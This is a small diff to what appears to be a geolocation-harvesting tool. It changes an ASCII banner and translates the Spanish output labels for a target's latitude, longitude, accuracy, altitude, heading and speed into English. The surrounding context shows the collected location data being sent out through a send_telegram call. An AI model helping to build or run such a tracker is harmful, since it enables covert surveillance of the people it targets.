@@ -117,7 +117,7 @@ def banner():
  
 						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-      					@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%./##           ,%.@@@@@@@@@@@@@@@@@@@@@@@
+      					        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%./##           ,%.@@@@@@@@@@@@@@@@@@@@@@@
 						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/*  *%(/*,*...***,,,,,&@@@@@@@@@@@@@@@@@@@@@@@
 						@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&# */*,...      ./ %  %%@@@@@@@@@@@@@@@@@@@@@@@@@@
 						@@@@@@@@@@@@@@@@@@@@@@@@@@@@* *.,         .   .*   .%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -401,12 +401,12 @@ def data_parser():
 				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
 				loc_info = f'''{Y}[!] Informacion de ubicacion :{W}
 
-{G}[+] {C}Latitud  : {W}{var_lat}
-{G}[+] {C}Longitud : {W}{var_lon}
-{G}[+] {C}precision  : {W}{var_acc}
-{G}[+] {C}Altitud  : {W}{var_alt}
-{G}[+] {C}Direcion : {W}{var_dir}
-{G}[+] {C}velocidad     : {W}{var_spd}
+{G}[+] {C}Latitude  : {W}{var_lat}
+{G}[+] {C}Longitude : {W}{var_lon}
+{G}[+] {C}Acurracy  : {W}{var_acc}
+{G}[+] {C}Altitude  : {W}{var_alt}
+{G}[+] {C}Direction : {W}{var_dir}
+{G}[+] {C}Speed     : {W}{var_spd}
 '''
 				utils.print(loc_info)
 				send_telegram(result_json, 'location')
